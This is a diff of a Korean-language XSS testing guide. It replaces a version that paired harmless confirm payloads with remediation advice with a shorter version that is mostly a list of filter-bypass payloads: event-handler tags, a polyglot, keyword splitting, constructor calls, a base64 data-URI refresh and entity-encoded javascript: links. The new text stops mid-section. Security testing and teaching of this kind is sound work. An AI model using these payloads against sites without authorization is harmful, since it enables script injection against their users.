@@ -1,179 +1,107 @@
-# XSS: 정의 & 원리 · 기본/특수 페이로드 · 조치 가이드 (Markdown)
+# Cross-Site Scripting (XSS) 취약점 점검 가이드
 
-> **주의/범위**: 본 문서는 보안 점검·교육 목적입니다. 승인된 환경에서만 사용하세요. 고객/사내 식별 정보(도메인·URL·토큰·스크린샷)는 공개 저장소에 올리지 마십시오.
-
----
-
-## 1) 정의 & 원리
-
-### 1.1 XSS란?
-사용자 브라우저에서 **의도치 않은 스크립트가 실행**되도록 만드는 취약점. 결과적으로 세션 도용, 피싱, 클릭재킹, 내부 API 오남용 등으로 이어질 수 있음.
-
-### 1.2 구분
-- **반사형(Reflected)**: 요청에 담긴 입력이 **즉시** 응답에 반영되어 실행. 링크 클릭만으로 트리거 가능.
-- **저장형(Stored)**: 공격 입력이 서버/DB에 **저장**되어, 이후 해당 콘텐츠를 조회하는 모든 사용자가 영향.
-- **DOM 기반(DOM XSS)**: 서버 HTML이 아니라 **클라이언트 JS**가 DOM을 조작하는 과정에서 발생(소스→싱크 흐름 문제).
-
-### 1.3 컨텍스트(문맥) 개념
-입력 값이 반영되는 위치에 따라 방어·공격 방법이 달라짐.
-- **HTML 본문**: `<div>여기</div>` 내부 텍스트/노드
-- **속성(Attribute)**: `value="여기"`, `title='여기'`
-- **URL/프로토콜**: `href="javascript:..."`, `src="data:..."`
-- **JS 문자열/식**: `var msg = "여기";`, `if (x == '여기')`
-- **CSS/스타일**: `<style>`, `style="..."` (현대 브라우저에선 script 실행 경로 제한적)
-
-### 1.4 DOM XSS의 소스/싱크(S→K) 모델
-- **소스(Source)**: `location.search`, `location.hash`, `document.referrer`, `localStorage`/`sessionStorage`, `postMessage` 등 외부 입력이 유입되는 지점
-- **싱크(Sink)**: `innerHTML/outerHTML`, `insertAdjacentHTML`, `document.write`, jQuery `.html()`, React `dangerouslySetInnerHTML` 등 **DOM에 HTML을 주입**하는 API
-- **핵심 원리**: *신뢰되지 않은 입력*이 *HTML 파서가 실행 가능한 위치*로 들어가면 XSS 발생
-
-### 1.5 실행 조건 & 영향 요인
-- **트리거**: 무클릭(자동), 원클릭(사용자 상호작용 필요), 복수 단계(드래그·키입력·포커스 등)
-- **권한/범위**: 게스트/로그인/관리자 화면, 1인/다수 사용자 영향
-- **방어 요소**: CSP, 템플릿 자동 이스케이프, Sanitizer(DOMPurify), 쿠키 HttpOnly/SameSite, 프레임워크의 안전 기본값
+이 문서는 웹 애플리케이션의 XSS(Cross-Site Scripting) 취약점을 점검하고 대응하기 위한 페이로드와 조치 방법을 정리한 가이드입니다.
 
 ---
 
-## 2) 기본 페이로드 (컨텍스트별 미니멀 세트)
+## 1. XSS 정의 & 원리 💡
 
-> 모두 **무해한 테스트용**으로 작성(확인 메시지). 상황에 맞는 **최소한의** 페이로드만 사용하세요.
+**XSS (Cross-Site Scripting)**는 공격자가 웹 애플리케이션에 악의적인 스크립트를 삽입하여 다른 사용자의 브라우저에서 실행되게 하는 공격 기법입니다. 사용자가 입력한 값을 검증 없이 그대로 페이지에 표시할 때 발생하며, 이 스크립트를 통해 공격자는 사용자의 세션 쿠키 탈취, 개인정보 유출, 악성 사이트 리다이렉션 등 다양한 악의적 행위를 할 수 있습니다.
 
-### 2.1 HTML 본문
-```html
-<img src=x onerror=confirm('XSS_TEST')>
-```
-- `<script>` 차단 환경에서도 동작 가능
-- 이미지 로드 실패를 `onerror`로 트리거
-
-### 2.2 속성(Attribute) 내부
-```html
-" autofocus onfocus=confirm('XSS_TEST') x="
-```
-- 따옴표로 속성 종료 → 이벤트 핸들러 삽입
-- `autofocus`/`onfocus`로 상호작용 최소화
-
-### 2.3 공백(스페이스) 제한 환경
-```html
-<svg/onload=confirm('XSS_TEST')>
-```
-- 공백 없이 이벤트/값 배치
-- 환경/브라우저 의존성 주의
-
-### 2.4 하이퍼링크/URL 컨텍스트
-```html
-<a href="javascript:confirm('XSS_TEST')">Click</a>
-```
-- CSP가 `javascript:`를 차단할 수 있음
-
-### 2.5 JS 문자열/식 컨텍스트
-```js
-";confirm('XSS_TEST');// 
-```
-- 문자열을 닫고 뒤에 JS 구문 삽입
-- 세미콜론·주석으로 문장 정리
-
-### 2.6 DOM 해시 주입(의심 시)
-```text
-#<img src=x onerror=confirm('XSS_TEST')>
-```
-- 응답 내 `location.hash` 사용 여부를 먼저 확인
+**핵심 원리**는 애플리케이션이 사용자의 입력을 '신뢰할 수 없는 데이터'로 취급하지 않고, '실행 가능한 코드'의 일부로 해석하여 페이지를 동적으로 생성할 때 발생합니다.
 
 ---
 
-## 3) 특수 페이로드 (필터/치환·정책 대응)
+## 2. 기본 페이로드 💉
 
-> 아래는 **필터/정책을 관찰**하며 제한적으로 시도하세요. 공격성/영향이 커질 수 있는 기법은 지양하고, PoC는 *확인 목적*에 한정합니다.
+가장 일반적이고 기본적인 형태의 XSS 페이로드입니다.
 
-### 3.1 `<script>`/일부 이벤트 차단 시
-```html
-<details onpointerover=confirm('XSS_TEST')></details>
-```
-- 마우스 오버로 트리거 (`onload/onerror`가 막힌 환경 우회)
+- **기본 스크립트 태그**
+  - `<script>` 태그를 사용하여 직접 자바스크립트를 실행합니다.
+    ```html
+    <script>alert(1111)</script>
+    ```
 
-### 3.2 단어 삭제/치환 필터 우회(개념 시연)
-```html
-<scr<script>ipt>confirm('XSS_TEST')</scr<script>ipt>
-```
-- 문자열 삭제 기반 필터가 `<script>`를 제거하는 경우 조합으로 재구성
-- **권장**: 차단 우회보다 안전 설계/조치 제안을 우선
+- **`<script>` 태그 우회**
+  - `<script>`와 같은 일반적인 태그 사용이 차단되었을 때, 다른 태그의 이벤트 핸들러를 이용합니다.
+    ```html
+    <details onpointerover=confirm(1111)></details>
+    <svg/onload=confirm(1111)/>
+    ```
 
-### 3.3 알림 함수명 필터링(단어) 대응
-```html
-<svg onload="window['con'+'firm']('XSS_TEST')"></svg>
-```
-- 함수명을 조합해 단어 필터 회피(개념)
+- **속성(Attribute) 값 내부에서 실행**
+  - HTML 태그의 속성 값 내부에서 이벤트 핸들러를 삽입하여 사용자의 특정 행동(키 입력, 포커스 등) 시 스크립트가 동작하게 합니다. 버튼 클릭과 같은 사용자 인터랙션이 필요할 수 있습니다.
+    ```html
+    " onkeydown=confirm(1111) contenteditable onfocus="
+    ```
+    *`contenteditable`과 `onfocus`를 함께 사용하면 해당 요소에 포커스가 갈 때 바로 스크립트가 실행되도록 유도할 수 있습니다.*
 
-### 3.4 괄호 차단 환경(백틱 활용 가능 여부)
-```html
-<img src=x onerror=confirm`XSS_TEST`>
-```
-- 백틱 호출을 허용하는지 환경에 따라 다름
-
-### 3.5 뒤에 추가 문구가 붙어 실패할 때(꼬리 자르기)
-```html
-<script>confirm('XSS_TEST')</script><!--
-```
-- 주석으로 뒤에 붙는 문자열 무력화
-
-### 3.6 메타 리다이렉트(정책 확인 필수)
-```html
-<meta http-equiv="refresh" content="0;url=data:text/html,<script>confirm('XSS_TEST')</script>">
-```
-- `data:`/인라인 스크립트는 CSP에서 차단될 수 있음
-
-### 3.7 인코딩·치환 전략(관찰 중심)
-- URL 인코딩: `%3C %3E %22 %28 %29 ...`
-- HTML 엔티티: `&#x3C; &#x3E; &#34; &#40; &#41;`
-- 유니코드: `< > " ( )`
-- **더블 인코딩**: `%2528` 등
-- 목적: 필터가 **어디서** 적용되는지(입력/저장/출력) 확인
-
-### 3.8 DOM XSS 전용 힌트
-- 소스: `location.search/hash`, `referrer`, `storage`, `postMessage`
-- 싱크: `innerHTML/insertAdjacentHTML/document.write`, jQuery `.html()`, React `dangerouslySetInnerHTML`
-- 절차: 소스→싱크 흐름 추적 → 싱크 직전 **최소 페이로드 1~2개**만 시도
-
-> **프레임워크 유의**: React/Vue의 템플릿 바인딩은 보통 안전하지만, **직접 HTML 주입 API**를 사용하면 위험해집니다.
+- **Polyglot XSS**
+  - 다양한 웹 환경(HTML, JavaScript, URL 등)에서 모두 유효하게 해석되어 실행될 수 있는 단일 페이로드입니다. 복잡한 필터링 환경을 우회하는 데 효과적입니다.
+    ```javascript
+    javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert(1)>>>
+    ```
 
 ---
 
-## 4) 조치 가이드 (개발팀 전달용)
+## 3. 상황별 우회 페이로드 및 점검 방법 ⚙️
 
-### 4.1 근본 원칙
-- **신뢰되지 않은 입력을 HTML로 렌더링하지 않기** (문자열을 DOM에 직접 주입하지 않기)
-- 템플릿/뷰 엔진의 **자동 이스케이프** 기능 활성화
+다양한 필터링 환경과 코드 컨텍스트에 따라 XSS를 성공시키기 위한 방법들입니다.
 
-### 4.2 컨텍스트별 출력 이스케이프
-- **HTML 본문**: `<` `>` `&`를 엔티티로
-- **속성 값**: 위 + `"` `'` 추가 이스케이프, 이벤트 핸들러 내 표현 금지
-- **URL**: 쿼리 구성은 URL 인코딩, `javascript:`/`data:` 프로토콜 금지
-- **JS 문자열/식**: 따옴표/백슬래시 이스케이프, 템플릿 리터럴 주의
+### 3.1. 컨텍스트(Context) 분석 및 탈출
 
-### 4.3 안전한 API 사용
-- 지양: `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, jQuery `.html()`
-- 권장: `textContent`, `setAttribute`(검증된 화이트리스트 값만), 프레임워크의 안전 바인딩
+먼저 입력 값이 HTML 문서의 어느 위치에 삽입되는지 파악하는 것이 중요합니다.
 
-### 4.4 Sanitizer
-- **DOMPurify** 등 검증된 Sanitizer를 사용(정책은 **화이트리스트 기반**)
-- 자체 정규식/블랙리스트로 HTML 정화하지 말 것(우회 가능)
+- **태그의 속성 값 내부에 입력될 경우**
+  - `"` (큰따옴표)나 `'` (작은따옴표)를 닫아 기존 속성을 탈출하고, 새로운 이벤트 핸들러 속성을 삽입합니다.
+  - **[예시]** `<input type="text" value="[입력 값]">`
+    ```html
+    <input type="text" value="" onpointerover=confirm(1111)">
+    ```
 
-### 4.5 CSP(Content Security Policy)
-- 기본 예시(상황에 맞게 조정):
-  ```http
-  Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'
-  ```
-- **nonce/hash 기반** 인라인 허용이 필요하면 일관되게 관리
-- `report-uri/report-to`로 탐지·관측 활성화
+- **태그와 태그 사이에 입력될 경우**
+  - `</tag>`로 기존 태그를 닫거나, 새로운 태그(`<script>`, `<svg>` 등)를 삽입합니다.
+  - **[예시]** `<a href="test.com">[입력 값]</a>`
+    ```html
+    <a href="test.com"></a><script>alert(1111)</script></a>
+    ```
 
-### 4.6 쿠키/세션 안전 설정
-- `HttpOnly; Secure; SameSite=Lax(or Strict)`
-- 토큰은 URL/해시에 노출하지 않기
+### 3.2. 주요 특수문자 필터링 우회
 
-### 4.7 프로세스/품질 게이트
-- 신규 화면 릴리스 전 **컨텍스트별 출력 테스트** 포함
-- 정적 분석/리뷰에서 `innerHTML/.html()/dangerouslySetInnerHTML` 사용 탐지
-- 리그레션 방지를 위한 **단위/통합 테스트**에 PoC 샘플 포함
+| 필터링 문자 | 우회 기법 및 페이로드 예시                                                                                             |
+| :---------- | :----------------------------------------------------------------------------------------------------------------- |
+| **< , >** | 입력 값이 태그 속성으로 들어갈 때, 태그 생성 없이 이벤트 핸들러만 삽입합니다.<br> `<input value="test" onpointerover=confirm(1111)/>` |
+| **( , )** | 백틱(`` ` ``)을 사용하여 함수를 호출합니다. (일부 브라우저에서만 동작)<br> `<img src=x onerror=alert`1`>`                         |
+| **" , '** | 태그 속성 값에 따옴표가 필요 없는 경우, 따옴표 없이 페이로드를 작성합니다.<br> `<svg onload=alert(1)>`                             |
+| **공백(space)** | 슬래시(`/`)를 공백 대신 사용합니다. (주로 SVG 태그에서 유효)<br> `<svg/onload=alert(1)/>`                                       |
 
----
+### 3.3. 키워드 및 함수 필터링 우회
 
-© 2025 XSS Guide — 연구/내부 점검 용도
+- **`script` 키워드 필터링**
+  - **단어 중간에 키워드 삽입**: 필터링 로직이 `script`를 찾아 제거할 경우, 이를 역이용합니다.
+    ```html
+    <scr<script>ipt>alert(1111)</scr<script>ipt>
+    ```
+  - **다른 태그 사용**: `<svg>`, `<img>`, `<details>`, `<iframe>` 등 스크립트 실행이 가능한 다른 태그를 활용합니다.
+    ```html
+    <img src=x onerror=alert(1)>
+    ```
+
+- **`alert`, `confirm`, `prompt` 함수 필터링**
+  - **문자열 조합**: 문자열을 합치거나 `window` 객체를 통해 함수를 동적으로 호출합니다.
+    ```html
+    <svg onload="window['ale'+'rt'](1)"></svg>
+    <iframe onload="this.contentWindow.constructor.constructor('alert(1)')()"></iframe>
+    ```
+  - **Base64 인코딩**: `data:` 스킴과 Base64 인코딩을 활용해 스크립트를 숨깁니다.
+    ```html
+    <meta HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxMTExKTwvc2NyaXB0Pg==">
+    ```
+    *위 Base64는 `<script>alert(1111)</script>`를 인코딩한 값입니다.*
+
+### 3.4. 인코딩을 이용한 우회
+
+- 필터링 시스템이 특정 인코딩만 해석하는 경우, 다른 종류의 인코딩을 사용하여 우회할 수 있습니다.
+- **HTML Entity 인코딩**: `href`, `src` 등 일부 속성에서는 HTML 엔티티가 디코딩되어 실행됩니다.
+  ```html
+  <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">Click Me</a>
